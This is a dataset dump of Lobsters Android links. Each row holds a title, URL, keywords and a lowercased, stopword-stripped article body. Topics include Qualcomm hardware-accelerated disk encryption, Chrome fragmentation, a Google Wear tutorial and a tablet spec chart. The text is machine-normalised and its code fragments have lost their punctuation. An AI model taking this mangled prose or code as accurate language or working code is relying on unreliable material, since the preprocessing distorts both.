priority refcnt selftest passed type cipher blocksize min keysize max keysize see three different implementation aes transformation built kernel different priority creating instance particular transformation client crypto api specify name kernel automatically return one highest priority particular example aesaesni implementation take advantage aesni instruction set available recent cpu returned new implementation added using cryptoregisteralg cryptoregisteralgs function api provides singleblock cipher hash combined order provide higherlevel cryptographic construct via template example aes cbc mode specified cbc aes template template nested order request composite transformation include one cryptographic primitive api defines synchronous asynchronous version cryptographic operation asynchronous operation return immediately deliver result via callback synchronous operation block result available crypto api also provides user space interface via dedicated socket type afalgaccelerating dmcryptdmcrypt par cipher specification aescbcessiv stock android passed part mapping table instantiates corresponding transforms via kernel crypto api thus order dmcrypt use hardware acceleration one either register hardwarebacked aes implementation high priority may affect kernel service use unique aes transformation name change mapping table accordingly pretty much soc used current android device come sort aescapable hardware usually order implement efficient drm omap device provide ecb aes cbc aes ctr aes implementation omapaesc backed omap crypto engine tegra device provide ecb aes cbc aes ofb aes tegraaesc backed nvidia bitstream engine device offer aes implementation take advantage dedicated aese aesd aesmc instruction cpu hardwarebacked aes transformation available device higher priority corresponding software implementation dmcrypt automatically use take advantage acceleration offloading dedicated hardwarecoprocessor providequalcomm crypto engine cryptographic hardware officially called crypto core provides hardware implementation de aes various mode ecb cbc etc authenticated encryption aead hmac hardwareseeded random number generator well support mobile communication algorithm like kasumi service provided crypto core integrated linux kernel form several driver qti crypto engine qcrypto kernel crypto api driver qcedev userspace application qcrypto qcedev depend provide different interface actual crypto hardware accessed either user space kernel space time therefore documentation recommends one interface enabled driver structure diagram kernel documentation qcrypto driver register following transformation kernel crypto api grep qcrypto proccryptogrep v kernel name ccm aes driver priority name ccm aes driver qcryptoaesccm priority name hmac driver priority name hmac driver priority name authenc hmac cbc driver priority name authenc hmac cbc de driver priority name authenc hmac cbc aes driver priority name driver priority name driver priority name qcomxts aes driver qcryptoxtsaes priority name qcomcbc driver priority name qcomecb driver priority name qcomcbc de driver qcryptocbcdes priority name qcomecb de driver qcryptoecbdes priority name qcomctr aes driver qcryptoctraes priority name qcomcbc aes driver qcryptocbcaes priority name qcomecb aes driver qcryptoecbaes priority see registered generic transformation name eg hmac qcom prefix whether use generic driverspecific name controlled device tree configuration interesting algorithm list qcomxts aes unlike cbc ctr xt cipher mode generic chaining mode specifically developed purpose blockbased disk encryption xt work wide block map nicely disk sector block efficiently generates tweak key different encrypted block using sector number offset sector variable input compared aescbcessiv xt complex implement le malleable even though authenticated cipher thus preferable linux kernel crypto api support xt technically dmcrypt could take advantage hardwarebacked aesxts implementation qualcomm ce without modification however dmcrypt designed operate sector used qualcomm ce would result many small request cryptographic hardware rather inefficient instead trying modify tune dmcrypt qualcomm added new devicemapper target use soc dmreqcryptintroducing dmreqcryptdmreqcrypt work encryption request sends asynchronous encryptiondecryption request snapdragon cryptographic module via kernel crypto api interface implemented qcrypto driver without going intricacy kernel programming important call us encrypt disk block tfm cryptoallocablkcipher qcomxts aes req ablkcipherrequestalloc tfm gfpkernel ablkcipherrequestsetcallback req cryptotfmreqmaybacklog reqcryptciphercomplete result cryptoablkcipherclearflags tfm cryptoablkciphersetkey tfm null keysizexts memset iv aesxtsivlen memcpy iv clone sector sizeof sectort ablkcipherrequestsetcrypt req reqsgin reqsgout totalbytesinreq void iv rc cryptoablkcipherencrypt req code first request asynchronous implementation qcomxts aes transform set encryption key allocates set request structure finally start encryption operation calling cryptoablkcipherencrypt function important bit input output buffer scatterlists reqsgin reqsgout hold sector whereas dmcrypt always encrypts single sector time another important detail encryption key passed aesxts transformation object via cryptoablkciphersetkey actually null address later discussion android fde implementation integrating dmreqcryptas dmcrypt disk encryption mounting handled cryptfs module vold daemon heavy lifting done device mapper kernel module changing vold support dmreqcrypt fairly straightforward type disk encryption stored crypto footer structure changed aesxts device mapper target used create dm device changed crypt map dmcrypt driver reqcrypt change triggered build time setting confighwdiskencryption macro disk encryption key passed kernel also called master key generated encrypted stored exactly way dmcrypt see diagram end post detail encrypted device booted pin password entered user run scrypt signed hardwarebound rsa key result run scrypt derive key encryption key kek iv turn used decrypt master key stored crypto footer master key passed device mapper driver part mapping table via ioctl call however dmreqcrypt implementation completely ignores passed cipher string encryption key iv offset us device path start sector parameter saw previous section key passed kernel crypto api also null actual disk encryption key come key managementthe key management implementation unfortunately proprietary depends qualcomm secure execution environment qsee also used implemented hardwarebacked keystore said glue code integrates vold well kernel driver open source get fairly good idea system work disk encryption key set updated cleared using cryptfshw glue library library merely load several function proprietary libqseecomapiso library using dlopen provides wrapper around example disk encryption key set calling sethwdeviceencryptionkey turn call qseecomupdatekeyuserinfo proprietary library function send command secure o via qseecom kernel driver visible user space devqseecom device generating disk encryption key cause qseecom driver request loading trusted app secure o sends qseosgeneratekey command kick key generation generated key appear stored ssd secure storage device partition point nexus key generated loaded hardware crypto engine using qseossetkey command henceforth used encryption decryption using hwaccelerated fdeas discussed integrating dmreqcrypt section two thing needed enable hardwareaccelerated disk encryption vold binary dmreqcrypt support libcryptfshw library course proprietary bit piece make qsee need place thus easier start stock image rather build one aosp required proprietary binary seem missing officially released tarballs everything place encryption work exactly fstabshamu file includes forceencrypt flag device encrypted first boot otherwise need kick encryption setting security encrypt phone one thing note way transition dmcrypt encrypted partition dmreqcrypt device already encrypted need wipe userdata partition first encryption completes crypto footer metadata partition look like android fde crypto footer magic major version minor version footer size byte flag key size bit failed decrypts crypto type aesxts encrypted key salt kdf scryptkeymaster nfactor rfactor pfactor crypt type pin f size encrypted upto hash first block scrypted ik important bit crypto type set aesxts actual disk encryption key manged crypto engine parameter encrypted key salt etc used verifying user pin password boot vold check value crypto type set aesxts load disk encryption key using cryptfshw library initializes dmreqcrypt device mapper target system simply mount created device data read writes decryptedencrypted transparentlyperformanceas expected hardwarebacked disk encryption performs better softwarebased dmcrypt implementation screenshots show actual number measured andebenchpro application lowtech dd readwrite result similar fdesoftware fdehardware fde see disk access using hardwarebacked disk encryption still slower unencrypted device random sequential read almost two time faster compared software implementation reading block data v nt hardwarebacked fde enabled current nexus build stability problemsunfortunately current implementation performs pretty well still problem especially device sleep mode device sleep mode relatively long period time read error occur userdata partition may mounted read wreaks havoc system content provider device may even power reboot seems fix issue userdata mounted readonly sqlite database storing system configuration account may get corrupted case fixed factory reset thus hardwareaccelerated disk encryption unfortunately currently quite suitable daily use nexus oneplus one snapdragon soc running cyanogenos also includes dmreqcryptbased fde implementation enabled box disk encryption triggered manually though fde implementation one oneplus one seems quite stable comparable performance random read hopefully problem nexus software one resolved kernel update summarydisk encryption android accelerated adding kernel crypto api driver take advantage soc cryptographic hardware allows block encryption offloaded main cpu improves disk access time device based recent qualcomm snapdragon soc nexus oneplus one take advantage soc crypto core module using qcedev qcrypto kernel driver dedicated disk encryption device mapper target dmreqcrypt batch encryption request order increase throughput also supported additionally disk encryption key managed tee secure app thus accessible android o including kernel using hardwareaccelerated fde disk access almost two time faster compared softwarebased dmcrypt implementation unfortunately major stability problem nexus hopefully fixed next android release hardwareaccelerated disk encryption enabled box
457,Lobsters,android,Android,The Similar Phone Finder,http://www.productchart.com/smartphones/similar,similar phone finder,similar phone finder,similar phone finder type name smartphone find alternative similar spec find similar smartphone euclidean distance
458,Lobsters,android,Android,Chrome continues to fall apart at brisk pace,http://www.quirksmode.org/blog/archives/2015/02/chrome_continue.html,chrome continues fall apart brisk pace,chrome continues fall apart brisk pace went necessarily default browser device eleven nine chrome lg chromium htc chromium come difference zoom reflow book stats statcounter update got stats studied plural chromium chromia mobilism,chrome continues fall apart brisk pace google chrome default browser android least eight chromiumbased android default browser subtly though wildly different number chromium family member recently risen nine eleven addition htc lg chromium default browser modern htc lg highend device moreover lg us least two different version concurrently htc replaced android webkit htc chromium air far know none done far order prove different study zoom reflow feature htc xiaomi support others including google went although google chrome installed android device necessarily default browser nexus device motorolas created google owned company official google chrome default browser device android device including samsung htc lg sony huawei xiaomi default browser homescreen google chrome found apps menu would highly surprised situation changed device still use android webkit android old default browser device vendor gradually replacing chrome chrome google eleven far aware nine chrome google chrome opera yandex xiaomi cyanogen puffin weird one samsung amazon silk nokia x nokia disappeared list microsoft nixed x line last two week found three new chromiumbased browser wde eleven chromiumbased browser thirteen count google chrome opera desktop mobile different browser lg chromium week ago someone showed new highend lg phone took opportunity identify browser turned chrome rather lg chromium however went friendly local phone store bought modern midrange lg turned chromium default browser tried updating firmware update therefore lg using least two chromium version time one two lie fact vice versa first time situation occurs far know htc chromium latest round testing htc default browser started acting reidentified lo behold changed android webkit chrome rather htc chromium moreover overtheair update think even individual app update rather full firmware update sure wish paid attention update certainly first instance know android webkit replaced ota chromium far buy new device come current chromium situation vendor version tested default remark google yes yes opera yes yandex yes xiaomi yes yes zoom reflow htc yes yes zoom reflow cyanogen yes yes lg yes yes midrange puffin yes proxy samsung yes yes amazon yes silk lg yes highend stop fun confidently expect sony motorola chinese vendor go custombuilt chromiumbased browser uc chinese browser vendor recently acquired alibaba might swap webkit chromium uc chromium google chrome oh remember chrome io chrome apple webview supposed safari allowed install rendering engine io chrome belong list difference let say classical education mind plural chromium chromia ask question different chromia eventually give detailed reply question test chromia except two device amazon silk lg far found slight difference instance input type datetime supported samsung htc lg chromia others might mild annoyance much detect way around zoom reflow normal zooming see part line htc zooming line reflow fit screen much interesting difference zoom reflow feature htc supported android vendor ignored read book know already let give others quick recap mobile browser zoom way beyond width line browser show part line pan horizontally order read fully htc always done something quite different zoom regular line fit screen reflows entire text fit essentially line become narrow order fit yes cause reflows throughout document thus somewhat expensive processorwise also potentially useful quite like know fact zoom reflow flag android webkit htc elected set flag others expect htc carry behaviour chromium google htc added zoom reflow chromium think google xiaomi chromium also feature might recent addition remember seeing earlier either postulate htc xiaomi developed feature independently shared code base received google money last option stats market share chromia unfortunately answer question public source completely absent statcounter public mobile browser stat service actually work distinguish chromium version number asked add feature happened yet update got stats september studied dutch stats happened come way slightly half chrome android hit came google chrome rest came mostly samsung chromium still back htc lg gone yet stats may changed see whip plural chromium chromia really annoying part web developer well google seem unaware situation find information nobody else care least nobody else blog issue although reason panic chromium much unified codebase android webkit occasionally run problem test site google chrome ignore ten others solution simple test device nongoogle chromia default browser modern highend samsungs htcs xiaomis lgs trick today brand follow testing chrome io hand useless since chromium make feel good expect say anything useful chromia also study client logfiles figure chromium version visiting site number share number make sure test chromia anyone actually listen nobody want know suppsedlytidy chrome android situation deteriorating fast never tidy begin decided talk issue conference starting mobilism finally hope google chrome great dev rel team pick concern start helping instance providing archive old chrome android test chromia google standard anyway year chromia
459,Lobsters,android,Android,Caddy - The HTTP/2 Web Server Made for Humans,https://caddyserver.com/,caddy web server made human,file server proxy download,file server proxy caddy flexible efficient static file server powerful scalable reverse proxy use serve static site compression template evaluation markdown rendering use dynamic reverse proxy number backends complete active passive health check load balancing circuit breaking caching download
460,Lobsters,android,Android,Android for Maven Eclipse version 1.3.0 release with Andmore support,https://github.com/rgladwell/m2e-android/releases/tag/1.3.0,android maven eclipse version release andmore support,patreon profile reload reload,repository archived owner readonly feature release version add two important new feature minor featuresfixes including using commercially like see frequent release please consider crowdfunding development patreon profile perform action time signed another tab window reload refresh session signed another tab window reload refresh session
462,Lobsters,android,Android,Build Your First Google Wear App,http://developer.telerik.com/featured/build-your-first-google-wear-app/,build first google wear app,google wear app grab bit android studio getting started creating ui writing logic speech recognizer testing app deploying device documentation wrapup google developer blog google wear site android central wearable blog telerik ui android techstage,ever since google introduced google wear developer preview march seen explosion wear apps google play store everything new watch face turn watch rolex apps help catch taxi train without pulling phone even major brand delta putting boarding pass watch new watch partner like samsung lg motorola plenty device importantly starting get user develop apps tutorial take look creating first google wear app help kickstart development effort space google wear app app going build today tip calculator twist instead manually entering bill amount tiny screen going use speech recognition input whole number going multiply whole number time percent standard tip display total bill amount watch able following command ok google open wearable tip app launched simply say whole number example grab bit follow along tutorial make sure using latest stable release android studio time writing using also make sure installed android sdk platform well android wear system image case nt watch shown everything installed ready create first wear app getting started begin starting new project giving name selecting phone tablet wear form factor shown please note phone tablet app select lower api level whereas wear app must using api kitkat moto watch testing upgraded using api tutorial one thing note moving need create phone tablet app order create android wear app like io must phone app create apple watch app word android wear app packaged apk file mobile app deployed watch screenshot moto watch app installed go ahead finish template add blank activity project loaded notice split project two folder mobile phone tablet app wear watch app going focus wear app tutorial expand folder look like image pay special attention following four file mainactivityjava code launch upon first boot adding code rectactivitymainxml user interface watch use rectangle screen like lg watch roundactivitymainxml user interface watch use round screen like moto stringsxml store string value make easier localize app creating ui let begin creating user interface round watch testing moto shortly click roundactivitymainxml notice already textview widget display text hello round world switch device preview wear round drag small button widget give text another center screen set onclick method name property panel onclickme look like following screenshot exact thing rectactivitymainxml preview wear square device keep app simple reuse textview widget display total bill amount button say another allow end user calculate another tip using speech recognition writing logic head mainactivityjava file add following import statement use shortly import androidcontentintent import androidspeechrecognizerintent import javautillist import javatextnumberformat declare two variable inside mainactivity class speech recognizer class provided google tip percent amount private static final int speechrecognizerrequestcode private float tippercent add following method creates intent start speech recognizer private void startspeechrecognition intent intent new intent recognizerintentactionrecognizespeech intentputextra recognizerintentextralanguagemodel recognizerintentlanguagemodelfreeform startactivityforresult intent speechrecognizerrequestcode add following method called activity result determines captured voice input successfully try convert float successful calculates total amount display label else update label phrase enter whole number override protected void onactivityresult int requestcode int resultcode intent data requestcode speechrecognizerrequestcode resultcode resultok list string result datagetstringarraylistextra recognizerintentextraresults string recognizedtext resultsget try extract total bill amount whole number try float billamount floatparsefloat recognizedtext calculate tip total float tipamount billamount tippercent float totalamount billamount tipamount display tip watch numberformat currency numberformatgetcurrencyinstance mtextviewsettext currencyformat totalamount catch numberformatexception ex mtextviewsettext enter whole number superonactivityresult requestcode resultcode data last thing invoke startspeechrecognition method last line oncreate method wire button created earlier public void onclickme view view startspeechrecognition testing app ui code place probably eager run app option create avd android virtual device android wear shown wo nt pick voice computer microphone automatically add support keyboard creating avd allow type number shown since actual device would like test speech recognition part app going deploy watch deploying device depending watch may may usb connection case testing moto allows debugging bluetooth thankfully easy setup documentation google provides would say tricky step finding android debug bridge life mac adding bashprofile later use window box nt seem issue easy way fix mac open terminal mac cd get home directory open e bashprofile add path adb add export path path userscrumplibraryandroidsdkplatformtools make sure change username ie crump case save file echo path return usrlocalbin usrbin bin usrsbin sbin userscrumplibraryandroidsdkplatformtools adb version return something like following android debug bridge version place long followed step documentation following device online hit run button select watch make sure say yes compatible field give minute compile load apk onto watch see speak screen able provide whole number quick video made showing action video source code app found go ahead fork repo try adding additional feature idea ability take two input parameter tip amount tip percent instead speak text app launched make say enter tip amount make tip amount appear phone well watch calculates total amount wrapup today learned write app run wrist recent improvement google wear lollipop help journey writing wearable apps like go check additional resource google developer blog blog google cover technology including wearable google wear site landing page android wearable starting point developing android wear app android central wearable blog party blog includes tip trick make android wear device telerik ui android native control android include variety chart calendar listview header image courtesy techstage
465,Lobsters,android,Android,Shitphone: A Love Story,https://medium.com/matter/shitphone-a-love-story-a44e66434807?source=reading-list,shitphone love story,living evangelizing proud citizen shitphone arrived homogeneity,living happily electronics shitworld long enough begun evangelizing last television hisense pulled storeroom north carolina walmart employee know simple vibrant led tv bad sound stereo built around insignia receiver best buy house label power speaker company called micca customer review star pretty good router made tplink customer review star keep online reliably netgear bought mother neat little baytek bluetooth speaker customer review star love even programmed voice draw es connected successsfully way suggests strictly mechanical familiarity english impulsebuy offbrand earbuds mixed result derive great satisfaction discovering good one bought used macbook work use chromebook whenever possible aspirational shittop consider situation failure mainstream laptop far enough along commoditization process purpose browsing emailing chatting dealing photo neartotality computer usage almost anything available topselling laptop amazon asus run window would suit need nicely see happens mac diesoffbrand electronics like branded counterpart interesting limited amount time highestend branded version product offer chance taste luxurious future technology shitworld version let preview practical future future global electronicsbuying public actually enjoy take jambox small dazzlingly expensive prism speaker battery wireless radio play music nearly phone respectable volume sensation year introduction offbrand speaker making major inroad online allowing shopper like feel like somehow gaming system requires course narrow convenient definition system year amazon america primary portal consumer electronics shitworld recently one proud citizen released version jambox concept pointedly dull name amazonbasics portable bluetooth speaker customer review star soon basic picnicready wireless speaker may become undistinguished disposable part many consumer lifestyle like usb stick battery point branded version minority sustained consumer looking bluetooth speaker signify luxury style taste offbrand electronics alluring feel like deal long popular branded alternative imply overpriced interesting word long make buyer feel smartone lesserappreciated joy online shopping process streamlining compressing expression capitalism call retail give u god eye view market pattern one search amazon newegg see category past present near future highmargin luxury option one side lowmargin outofdate goodenough option unlikely unknown brand big mushy middle brand fighting diminishing opportunity faintly empowering watch compressed cycle modern consumer electronics pas viewfinder give calming order industry depends perception perpetually exceptional perspective also help enforce realism relationship consumer electronics whether choose luxury option commodity option something buying future garbageit feel little early shitphone offbrand electronics easier conceive legokit assembly part offbrand tv confusing menu system slow remote huge deal tv watching passive job show picture smartphone job connect hundred people dozen internet service smartphone extremely expensive extremely small extremely complex machine interactive object must receive command ably provides information relationship must sustain hundred expectant touch day must miserablethe arrival acceptable shitphones would represent final commoditization entire era consumer electronics laptop flipphones wearable implant redacted return consumption sector thank last warning shitphone arrived time delivered doorstep temporary rental home quietly dog notice appeared final invisible link labor chain stretching back blu product anonymous rectangular structure industrial suburb miami back factory special economic zone china side box sort manifest handset battery charger etc back box basic aside mysterious marking seal anatel example brazil version fcc packaging serviceable even helpful like nutritional information advertising neatly packed around thick light shiny phone headphone case screen protector installed sim slotted sd card activated phone installed apps screen fine software android aka jelly bean new abandoned camera took picture internet connected mostly charged beganthe first day shitphone one long sigh relief everything worked least seemed work app needed download chatted groupme checked instagram took picture texted made call went run listened music streamed internet dictated direction google map got supposed go typing little slow gmail would pause moment proof concept shitphone performing better expected tenth price iphone begun resent getting nearly functionality end day active one charge left nice nice nice set alarm next morning woke uphomogeneity expect shitphones get buy blu unnecto posh mobile prestigio yezz infocus irulu expect similar box part sorted price point gut likely lowtomidrange hardware mediatek mostly invisible u market second largest supplier mobile phone systemsonchip world mean phone share specification quirky feature even cheapest phone let use two sim card example many fm radio shell must fit around mediatek core technology stick basic style bigger phone seamless rectangle particular thickness small one roundback thickbezel handset evoke iphone cheaper phone get android dollar android case major brand shitphones latest version android becoming availablepremium branded phone culmination decade research wireless technology computing material design shitphones culmination decade research wireless technology computing material design minus year two shitphones generally actually shitty isolate distorting effect highly competitive preferencedriven smartphone retail marketing absence help keep cheap marvel engineering execution assembled precision care able accomplish task halfdozen year ago would inconceivable portable device iphones really shitphones futurethis commoditization feel like genuine novelty rapidly reduced thankless anonymity iphone highend competitor benefited year visible functional instance profoundly globally novel new product one pioneering brand beginning new technological era sell someone first magical hand device apply temporary multiplier everything brand recognition loyalty profit brand temporary protective spell cast inevitable approach anniversary release iphone category blew starting feel familiar american purchased smartphone contract bought discarded least three device smartphones mature reality use improve disappear little emailing instagramming facebooking snapchatting whatsapping angrybirdsing anyway
466,Lobsters,android,Android,An interactive Comparison Chart of the 300 most popular Tablets,http://www.productchart.com/tablets/,interactive comparison chart popular tablet,amazon fire kid detail dragon touch detail zonko detail dragon touch detail jumper ezpad pro detail vankyo matrixpad detail dragon touch detail dragon touch pro detail dragon touch detail zonko detail vankyo matrixpad detail hoozo detail topelotek detail vankyo matrixpad detail vankyo matrixpad detail microsoft surface go detail vankyo matrixpad detail vankyo matrixpad detail samsung galaxy tab lite detail contixo detail veidoo detail vankyo matrixpad detail vatenick detail samsung galaxy tab detail microsoft surface detail detail pritom detail winsing detail chuwi x detail rca viking pro detail detail lectrus detail samsung galaxy tab detail microsoft surface go detail meberry detail rca atlas pro detail chuwi ubook detail jinheng detail lenovo tab detail dragon touch detail nuvision encite split detail simbans tangotab detail detail dragon touch notepad detail vankyo matrixpad detail aoyodkg detail microsoft surface pro detail samsung galaxy tab detail microsoft surface pro x detail dragon touch detail vucatimes detail apple ipad mini detail yisence detail apple ipad pro detail microsoft surface book detail rca galileo pro detail detail samsung galaxy tab detail hoozo detail hoozo detail asiur detail winnovo detail apple ipad mini detail ujoyfeel detail flyingtech detail surfans detail lenovo tab detail lenovo smart tab detail lenovo tab detail forentek detail prograce detail ujoyfeel detail lenovo tab detail microsoft surface go detail winsing detail microsoft surface book detail chenen detail nxy detail samsung galaxy tab detail rca voyager detail remarkable detail microsoft surface pro detail yellyouth detail microsoft surface pro x detail samsung galaxy tab detail samsung galaxy tab e lite detail microsoft surface pro detail asus zenpad detail samsung galaxy tab detail samsung galaxy tab detail yellyouth detail lectrus detail lenovo tab detail samsung galaxy tab e detail forentek detail samsung galaxy tab detail samsung galaxy tab detail samsung galaxy tabpro detail lectrus detail samsung galaxy tab detail victbing detail sumtab pro detail yisence detail microsoft surface detail victbing detail lenovo yoga book detail rca voyager pro detail azpen detail microsoft surface pro detail lenovo tab detail microsoft surface pro detail google pixel slate detail lenovo smart tab detail apple ipad air detail lenovo tab plus detail manjee detail detail yellyouth detail detail samsung galaxy tab detail apple ipad mini detail yuntab detail apple ipad mini detail yitaoera detail microsoft surface pro x detail samsung galaxy view detail microsoft surface detail apple ipad pro detail lenovo yoga tab detail victbing detail microsoft surface pro detail dragon touch plus detail microsoft surface pro x detail microsoft surface pro detail contixo detail lenovo yoga tab pro detail apple ipad pro detail samsung galaxy tab detail winsing detail microsoft surface pro detail beyondtab detail apple ipad air detail asus zenpad detail microsoft surface pro detail lenovo thinkpad detail detail,amazon fire kid price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce zonko price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce jumper ezpad pro price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch pro price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce zonko price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce topelotek price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab lite price aug pst detail screen inch pixel x storage gb ram gb weight ounce contixo price aug pst detail screen inch pixel x storage gb ram gb weight ounce veidoo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vatenick price aug pst detail screen inch pixel unknown x unknown storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce pritom price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce chuwi x price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca viking pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce meberry price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca atlas pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce chuwi ubook price aug pst detail screen inch pixel x storage gb ram gb weight ounce jinheng price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce nuvision encite split price aug pst detail screen inch pixel x storage gb ram gb weight ounce simbans tangotab price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch notepad price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce aoyodkg price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vucatimes price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yisence price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface book price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca galileo pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce asiur price aug pst detail screen inch pixel x storage gb ram gb weight ounce winnovo price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce ujoyfeel price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce flyingtech price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce surfans price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo smart tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce forentek price aug pst detail screen inch pixel x storage gb ram gb weight ounce prograce price aug pst detail screen inch pixel x storage gb ram gb weight ounce ujoyfeel price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface book price aug pst detail screen inch pixel x storage gb ram gb weight ounce chenen price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce nxy price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca voyager price aug pst detail screen inch pixel x storage gb ram gb weight ounce remarkable price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab e lite price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce asus zenpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab e price aug pst detail screen inch pixel x storage gb ram gb weight ounce forentek price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tabpro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce sumtab pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce yisence price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga book price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca voyager pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce azpen price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce google pixel slate price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo smart tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad air price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab plus price aug pst detail screen inch pixel x storage gb ram gb weight ounce manjee price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram unknown gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yuntab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yitaoera price aug pst detail screen inch pixel x storage gb ram gb weight 